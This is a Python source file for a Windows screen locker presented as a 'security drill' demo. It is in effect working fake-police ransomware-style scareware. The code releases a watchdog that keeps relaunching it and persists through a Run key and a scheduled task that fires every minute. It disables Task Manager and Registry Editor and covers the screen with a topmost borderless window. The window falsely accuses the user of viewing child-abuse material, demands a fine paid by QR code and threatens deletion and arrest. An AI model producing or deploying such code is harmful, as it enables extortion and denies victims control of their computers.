# -*- coding: utf-8 -*-

"""
网络安全演练 UI - 终极单 EXE 版（内嵌 watchdog）
========================================================
功能：
    - 首次运行释放 watchdog.exe 到 %TEMP%，启动后退出
    - watchdog 负责持续监控并拉起主程序
    - 主程序具备开机自启、计划任务、禁用任务管理器/注册表等粘性功能
    - 退出方式：Ctrl+Shift+Q 连续 3 次（ESC 已移除）
    - 左上角徽章支持图片（badge.png）
    - 自定义弹窗支持图片（info.png），无标题栏
    - 控制台仅显示启动信息，详细日志写入文件
"""

import sys
import os
import subprocess
import tempfile
import shutil
import time
import random
import string
import math
import socket
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
from pathlib import Path

# 尝试导入 PIL（用于 PNG 图片支持）
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    # 启动时若未安装，在日志中提示（但日志系统尚未初始化，先忽略）

# ============================================================
# 日志系统（控制台仅显示启动信息，详细日志写入文件）
# ============================================================
_log_file = None

def init_log():
    """初始化日志文件（在程序启动时调用）"""
    global _log_file
    try:
        # 确定日志目录
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.getcwd()
        log_dir = os.path.join(base_dir, 'logs')
        os.makedirs(log_dir, exist_ok=True)

        log_path = os.path.join(log_dir, f'SecurityDemo_{datetime.now().strftime("%Y%m%d")}.log')
        _log_file = open(log_path, 'a', encoding='utf-8')
        # 写入一条分隔线
        _log_file.write(f"\n{'='*60}\n")
        _log_file.write(f"日志开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        _log_file.flush()
    except Exception as e:
        # 若文件打开失败，降级为仅控制台
        print(f"[警告] 无法创建日志文件: {e}")
        _log_file = None

def log(msg, console=None):
    """
    写入日志：
      - 若 console 未指定，自动判断：包含 '✅' 或 '❌' 则仅写文件，不打印控制台
      - 否则打印到控制台并写入文件
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"

    # 写入文件
    if _log_file:
        try:
            _log_file.write(full_msg + '\n')
            _log_file.flush()
        except:
            pass

    # 决定是否打印到控制台
    if console is None:
        # 自动判断：若含有操作符号，则默认不打印到控制台
        console = not ('✅' in msg or '❌' in msg)
    if console:
        print(full_msg)

# ============================================================
# 配置
# ============================================================
WINDOW_BG = "#050505"
PANEL_WIDTH = 1120
PANEL_HEIGHT = 720
WHITE = "#FFFFFF"
BLACK = "#000000"
RED = "#FF1010"
DARK_RED = "#A00000"
BLUE = "#0808E8"
GRAY = "#D3D3D3"
GREEN = "#008A00"

# ============================================================
# 工具函数
# ============================================================
def generate_demo_id():
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choice(chars) for _ in range(10))

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "UNKNOWN-PC"

def get_timezone():
    try:
        return datetime.now().astimezone().tzinfo.__class__.__name__
    except:
        return "Local Time"

def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_admin():
    """检测当前进程是否以管理员权限运行（仅Windows）"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# ============================================================
# Windows 系统修改功能
# ============================================================
class WindowsPersistence:
    @staticmethod
    def is_windows():
        return sys.platform == "win32"

    @staticmethod
    def add_startup(exe_path):
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SecurityDemo", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            log("✅ 已添加开机自启", console=False)
            return True
        except Exception as e:
            log(f"❌ 添加开机自启失败: {e}", console=False)
            return False

    @staticmethod
    def remove_startup():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SecurityDemo")
            winreg.CloseKey(key)
            log("✅ 已删除开机自启", console=False)
        except:
            pass

    @staticmethod
    def add_scheduled_task(exe_path):
        if not WindowsPersistence.is_windows():
            return False
        try:
            cmd = f'schtasks /create /tn "SecurityDemoTask" /tr "{exe_path}" /sc MINUTE /mo 1 /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True)
            log("✅ 已创建计划任务", console=False)
            return True
        except Exception as e:
            log(f"❌ 创建计划任务失败: {e}", console=False)
            return False

    @staticmethod
    def remove_scheduled_task():
        if not WindowsPersistence.is_windows():
            return
        try:
            subprocess.run('schtasks /delete /tn "SecurityDemoTask" /f', shell=True, capture_output=True)
            log("✅ 已删除计划任务", console=False)
        except:
            pass

    @staticmethod
    def disable_taskmgr():
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log("✅ 已禁用任务管理器", console=False)
            return True
        except Exception as e:
            log(f"❌ 禁用任务管理器失败: {e}", console=False)
            return False

    @staticmethod
    def enable_taskmgr():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log("✅ 已恢复任务管理器", console=False)
        except:
            pass

    @staticmethod
    def disable_regedit():
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log("✅ 已禁用注册表编辑器", console=False)
            return True
        except Exception as e:
            log(f"❌ 禁用注册表编辑器失败: {e}", console=False)
            return False

    @staticmethod
    def enable_regedit():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log("✅ 已恢复注册表编辑器", console=False)
        except:
            pass

# ============================================================
# 释放并启动 watchdog
# ============================================================
def release_and_launch_watchdog():
    """释放内嵌的 watchdog.exe 到临时目录并启动，返回是否成功"""
    if os.environ.get('WATCHDOG_LAUNCHED') == '1':
        return False

    # 获取资源路径
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    src_watchdog = os.path.join(base_path, 'watchdog.exe')
    if not os.path.exists(src_watchdog):
        log("警告：未找到 watchdog.exe，跳过守护启动")
        return False

    # 目标临时目录
    temp_dir = os.path.join(tempfile.gettempdir(), 'SecurityDemoWatchdog')
    os.makedirs(temp_dir, exist_ok=True)
    target_watchdog = os.path.join(temp_dir, 'watchdog.exe')

    # 复制文件
    if not os.path.exists(target_watchdog) or os.path.getmtime(src_watchdog) > os.path.getmtime(target_watchdog):
        shutil.copy2(src_watchdog, target_watchdog)

    # 构造 watchdog 启动参数
    current_exe = sys.executable
    cmd = [target_watchdog, '--target', current_exe]
    if '--persist' in sys.argv or '-p' in sys.argv:
        cmd.append('--persist')

    # 启动 watchdog（无窗口）
    subprocess.Popen(
        cmd,
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    log("✅ watchdog 已启动，主进程退出", console=False)
    return True

# ============================================================
# 获取资源文件路径（兼容开发环境和打包环境）
# ============================================================
def resource_path(relative_path):
    """获取资源的绝对路径，支持 PyInstaller 打包"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ============================================================
# 主 UI 类
# ============================================================
class SecurityDemoUI:
    def __init__(self, enable_persistence=False):
        self.enable_persistence = enable_persistence and WindowsPersistence.is_windows()
        self.is_admin = is_admin()  # 检测管理员权限

        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg=WINDOW_BG)
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        try:
            self.root.attributes("-fullscreen", True)
        except:
            w = self.root.winfo_screenwidth()
            h = self.root.winfo_screenheight()
            self.root.geometry(f"{w}x{h}+0+0")

        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()

        self.demo_id = generate_demo_id()
        self.local_ip = get_local_ip()
        self.hostname = get_hostname()
        self.timezone = get_timezone()
        self.countdown_end = datetime.now() + timedelta(hours=72)
        self.exit_count = 0
        self.last_exit_press = 0

        # 启动信息输出到控制台（同时写入文件）
        log("======================================")
        log(f"启动时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log(f"本机 IP：{self.local_ip}")
        log(f"电脑名称：{self.hostname}")
        log("您的所在位置：已确定")
        log("计算机所有文件：已锁定")
        log("罚款支付：扫描二维码")
        log(f"进程守护：{'启用' if self.enable_persistence else '禁用'}")
        log(f"管理员权限：{'是' if self.is_admin else '否'}")

        # 构建 UI
        self.build_gui()

        # 启动实时更新
        self.update_live_info()
        self.update_countdown()

        # 绑定退出快捷键（仅 Ctrl+Shift+Q）
        self.root.bind("<Control-Shift-Q>", self.exit_shortcut)
        self.root.bind("<Control-Shift-q>", self.exit_shortcut)

        # 应用粘性
        if self.enable_persistence:
            self.apply_persistence()

        # 窗口关闭事件（清理）
        self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)

    # ============================================================
    # GUI 构建（完整版，包含徽章图片支持）
    # ============================================================

    def build_gui(self):
        # 主背景
        bg = tk.Frame(self.root, bg=WINDOW_BG)
        bg.pack(fill="both", expand=True)

        # 中央面板
        panel_x = (self.screen_width - PANEL_WIDTH) // 2
        panel_y = (self.screen_height - PANEL_HEIGHT) // 2
        self.panel = tk.Frame(
            self.root,
            bg=WHITE,
            highlightbackground=RED,
            highlightthickness=5
        )
        self.panel.place(x=panel_x, y=panel_y, width=PANEL_WIDTH, height=PANEL_HEIGHT)

        # 顶部区域（徽章 + 状态）
        self.create_top()

        # 主体区域
        self.create_body()

        # 左下角标识
        tk.Label(
            self.root,
            text=f"SECURITY TRAINING DEMO    ID: {self.demo_id}",
            font=("Consolas", 8),
            fg="#777777",
            bg=WINDOW_BG
        ).place(x=12, y=self.screen_height - 25)

    def create_top(self):
        top = tk.Frame(self.panel, bg=WHITE)
        top.place(x=18, y=18, width=PANEL_WIDTH - 36, height=180)

        # --- 左侧徽章（支持图片，若图片不存在则绘制五角星） ---
        badge_container = tk.Frame(top, bg=WHITE, width=165, height=165)
        badge_container.place(x=5, y=2)

        # 尝试加载 badge.png
        badge_img_path = resource_path("badge.png")
        if os.path.exists(badge_img_path) and PIL_AVAILABLE:
            try:
                img = Image.open(badge_img_path)
                # 缩放至合适大小（保持宽高比）
                img.thumbnail((150, 150))
                self.badge_photo = ImageTk.PhotoImage(img)
                lbl = tk.Label(badge_container, image=self.badge_photo, bg=WHITE)
                lbl.place(relx=0.5, rely=0.5, anchor="center")
                log("✅ 已加载徽章图片 badge.png", console=False)
            except Exception as e:
                log(f"⚠️ 徽章图片加载失败，使用五角星: {e}", console=False)
                self._draw_star_badge(badge_container)
        else:
            if not PIL_AVAILABLE:
                log("⚠️ Pillow 未安装，无法显示 PNG 图片，使用五角星", console=False)
            else:
                log("⚠️ badge.png 未找到，使用五角星", console=False)
            self._draw_star_badge(badge_container)

        # --- 右侧状态框 ---
        self.status_box = tk.Frame(top, bg=GRAY, relief="solid", bd=1)
        self.status_box.place(x=745, y=8, width=340, height=158)

        self.ip_value = self._create_status_row(0, "本机 IP：", self.local_ip, GREEN)
        self.hostname_value = self._create_status_row(1, "设备名称：", self.hostname, BLACK)
        self.timezone_value = self._create_status_row(2, "当前时区：", self.timezone, BLACK)
        self.time_value = self._create_status_row(3, "当前时间：", get_current_time(), DARK_RED)
        self.persistence_value = self._create_status_row(4, "粘性模式：",
                                                         "启用" if self.enable_persistence else "禁用",
                                                         RED if self.enable_persistence else GREEN)

    def _draw_star_badge(self, container):
        """绘制五角星徽章（后备方案）"""
        canvas = tk.Canvas(container, width=165, height=165, bg=WHITE, highlightthickness=0)
        canvas.pack()
        # 外圈
        canvas.create_oval(5, 5, 160, 160, fill="#E3E3E3", outline="#B0B0B0", width=2)
        canvas.create_oval(15, 15, 150, 150, fill="#E6C900", outline="#9B8700", width=2)
        canvas.create_oval(27, 27, 138, 138, fill="#D51920", outline="#A30000", width=2)
        # 大星星
        self._draw_star(canvas, 82, 57, 25, "#FFD900")
        # 小星星
        for x, y, r in [(51, 77, 9), (114, 77, 9), (59, 104, 8), (106, 104, 8)]:
            self._draw_star(canvas, x, y, r, "#FFD900")
        canvas.create_text(82, 124, text="安全演练", font=("Microsoft YaHei", 14, "bold"), fill="#FFD900")

    def _draw_star(self, canvas, cx, cy, radius, color):
        points = []
        for i in range(10):
            angle = math.pi / 2 + i * math.pi / 5
            r = radius if i % 2 == 0 else radius * 0.42
            x = cx + r * math.cos(angle)
            y = cy - r * math.sin(angle)
            points.extend([x, y])
        canvas.create_polygon(points, fill=color, outline=color)

    def _create_status_row(self, index, label, value, color):
        y = 10 + index * 28
        tk.Label(self.status_box, text=label, font=("Microsoft YaHei", 12),
                 bg=GRAY, fg="#111111", anchor="w").place(x=10, y=y, width=105)
        lbl = tk.Label(self.status_box, text=value, font=("Microsoft YaHei", 12, "bold"),
                       bg=GRAY, fg=color, anchor="w")
        lbl.place(x=118, y=y, width=210)
        return lbl

    def create_body(self):
        body = tk.Frame(self.panel, bg=WHITE)
        body.place(x=20, y=200, width=PANEL_WIDTH - 40, height=500)

        # 警告条
        tk.Frame(body, bg="#BBBBEE").place(x=15, y=15, width=420, height=110)
        canvas = tk.Canvas(body, width=420, height=110, bg=WHITE, highlightthickness=0)
        canvas.place(x=5, y=5)
        canvas.create_rectangle(5, 5, 210, 105, fill="#D5003D", outline="")
        canvas.create_rectangle(210, 5, 415, 105, fill=BLUE, outline="")
        canvas.create_text(210, 55, text="你的电脑已被锁定！",
                           font=("Microsoft YaHei", 26, "bold"), fill=WHITE)

        # 标题
        tk.Label(body, text=f"执行编号：{self.demo_id}",
                 font=("Microsoft YaHei", 25, "bold"), bg=WHITE, fg="#006000", anchor="w").place(x=465, y=12)
        tk.Label(body, text="你被罚款", font=("Microsoft YaHei", 33, "bold"),
                 bg=WHITE, fg=BLACK, anchor="w").place(x=465, y=62)
        tk.Label(body, text="380", font=("Microsoft YaHei", 30, "bold"),
                 bg=WHITE, fg=DARK_RED, anchor="w").place(x=710, y=61)

        # 正文
        text = (
            "您因多次访问包含中华人民共和国法律禁止的内容\n"
            "\n"
            "即恋童癖和虐待儿童内容的色情网站而被禁止。\n"
            "\n"
            "您必须根据第0945-I3467361778号条例\n"
            "将800元 罚款转入公安部罚款征收账户。\n"
            "\n"
            "支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！"
        )
        tk.Label(body, text=text, font=("Microsoft YaHei", 15),
                 bg=WHITE, fg="#111111", justify="left", wraplength=1030).place(x=12, y=140, width=1030, height=170)

        # 按钮
        tk.Frame(body, bg="#D0D0D0").place(x=444, y=320, width=245, height=66)
        tk.Button(body, text="查看演练说明", font=("Microsoft YaHei", 16, "bold"),
                  fg=WHITE, bg="#9D0000", activeforeground=WHITE, activebackground="#CC0000",
                  relief="flat", bd=0, command=self.show_demo_info).place(x=438, y=314, width=245, height=66)

        # 底部提示
        tk.Label(body, text="支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！", font=("Microsoft YaHei", 18, "bold"),
                 bg=WHITE, fg=DARK_RED).place(x=0, y=405, width=1060, height=32)
        notice = (
            "重要须知！如果您拒绝支付罚款或试图在不支付罚款的情况下自行解除锁定，您计算机上的所有信息将被永久删除，以防止色情制品的传播\n"
            "警方将立即前往您的住处逮捕您。你将因观看和传播带有恋童癖和虐待儿童内容的色情制品而受到刑事起诉。罚款支付期限；通知和锁定发出后3小时。\n"
        )
        tk.Label(body, text=notice, font=("Microsoft YaHei", 13),
                 bg=WHITE, fg=DARK_RED, justify="center", wraplength=1030).place(x=20, y=440, width=1020, height=80)

        # 倒计时
        tk.Label(body, text="演练计时：", font=("Microsoft YaHei", 13, "bold"),
                 bg=WHITE, fg=BLACK).place(x=440, y=505)
        self.countdown_label = tk.Label(body, text="72:00:00", font=("Consolas", 18, "bold"),
                                        bg=WHITE, fg=DARK_RED)
        self.countdown_label.place(x=545, y=503)

        # 退出提示
        tk.Label(body, text="第0945-I3467361778号罚款",
                 font=("Microsoft YaHei", 9), bg=WHITE, fg="#777777").place(x=0, y=540, width=1060)

    # ============================================================
    # 实时更新
    # ============================================================

    def update_live_info(self):
        try:
            self.local_ip = get_local_ip()
            self.ip_value.config(text=self.local_ip)
            self.hostname_value.config(text=get_hostname())
            self.timezone_value.config(text=get_timezone())
            self.time_value.config(text=get_current_time())
        except Exception as e:
            log(f"更新失败: {e}", console=False)
        self.root.after(2000, self.update_live_info)

    def update_countdown(self):
        remaining = (self.countdown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            self.countdown_label.config(text="00:00:00")
            return
        hours, rem = divmod(int(remaining), 3600)
        mins, secs = divmod(rem, 60)
        self.countdown_label.config(text=f"{hours:02d}:{mins:02d}:{secs:02d}")
        self.root.after(1000, self.update_countdown)

    # ============================================================
    # 自定义弹窗（支持图片，无标题栏）
    # ============================================================

    def show_demo_info(self):
        """自定义弹窗，包含图片和文字，无标题栏"""
        popup = tk.Toplevel(self.root)
        popup.title("")  # 空标题
        popup.overrideredirect(True)          # 去掉标题栏
        popup.attributes("-topmost", True)
        popup.configure(bg=WHITE)

        # 窗口居中
        pw, ph = 500, 350
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - pw) // 2
        y = (sh - ph) // 2
        popup.geometry(f"{pw}x{ph}+{x}+{y}")

        # 红色边框（模仿主界面风格）
        popup.configure(highlightbackground=RED, highlightthickness=3)

        # ---- 内容 ----
        content_frame = tk.Frame(popup, bg=WHITE)
        content_frame.pack(fill="both", expand=True, padx=15, pady=15)

        # 尝试加载 info.png
        info_img_path = resource_path("info.png")
        img_label = None
        if os.path.exists(info_img_path) and PIL_AVAILABLE:
            try:
                img = Image.open(info_img_path)
                img.thumbnail((200, 150))
                photo = ImageTk.PhotoImage(img)
                img_label = tk.Label(content_frame, image=photo, bg=WHITE)
                img_label.image = photo  # 保持引用
                img_label.pack(pady=(0, 10))
            except Exception as e:
                log(f"⚠️ 弹窗图片加载失败: {e}", console=False)

        # 文字说明
        info_text = (
            f"网络安全说明\n\n"
            f"执行编号：{self.demo_id}\n"
            f"本机 IP：{self.local_ip}\n"
            f"设备名称：{self.hostname}\n"
            f"时区：{self.timezone}\n\n"
            "你已被锁定。\n"
            "请扫描二维码缴纳罚款。"
        )
        lbl = tk.Label(content_frame, text=info_text, font=("Microsoft YaHei", 12),
                       bg=WHITE, fg=BLACK, justify="center")
        lbl.pack(pady=5)

        # 确定按钮
        btn = tk.Button(content_frame, text="确 定", font=("Microsoft YaHei", 12, "bold"),
                        bg="#9D0000", fg=WHITE, relief="flat", bd=0,
                        command=popup.destroy, width=12, height=1)
        btn.pack(pady=12)

        # 点击窗口外部不会关闭，必须点按钮

        # 设置焦点
        popup.focus_set()

    # ============================================================
    # 粘性功能应用与清理
    # ============================================================

    def apply_persistence(self):
        exe_path = sys.executable
        WindowsPersistence.add_startup(exe_path)
        WindowsPersistence.add_scheduled_task(exe_path)
        WindowsPersistence.disable_taskmgr()
        WindowsPersistence.disable_regedit()
        log("✅ 所有粘性功能已应用", console=False)

    def cleanup_persistence(self):
        WindowsPersistence.remove_startup()
        WindowsPersistence.remove_scheduled_task()
        WindowsPersistence.enable_taskmgr()
        WindowsPersistence.enable_regedit()
        log("✅ 清理完成", console=False)

    # ============================================================
    # 退出逻辑（仅 Ctrl+Shift+Q 三次）
    # ============================================================

    def exit_shortcut(self, event=None):
        now = time.time()
        if now - self.last_exit_press > 2.0:
            self.exit_count = 0
        self.last_exit_press = now
        self.exit_count += 1
        log(f"退出快捷键: {self.exit_count}/3", console=False)
        if self.exit_count >= 3:
            self.safe_exit()

    def safe_exit(self, event=None):
        log("正在安全退出...")
        if self.enable_persistence:
            self.cleanup_persistence()
        self.root.destroy()
        log("程序已退出")
        # 关闭日志文件
        global _log_file
        if _log_file:
            try:
                _log_file.close()
            except:
                pass
        sys.exit(0)

    # ============================================================
    # 运行
    # ============================================================

    def run(self):
        self.root.mainloop()

# ============================================================
# 主入口
# ============================================================

def main():
    # 初始化日志系统（先于任何 log 调用）
    init_log()

    # 如果当前不是由 watchdog 启动，则释放并启动 watchdog
    if os.environ.get('WATCHDOG_LAUNCHED') != '1':
        if release_and_launch_watchdog():
            sys.exit(0)  # 原进程退出，由 watchdog 接管

    # 正常启动 UI
    enable_persistence = '--persist' in sys.argv or '-p' in sys.argv
    app = SecurityDemoUI(enable_persistence=enable_persistence)
    app.run()

if __name__ == '__main__':
    main()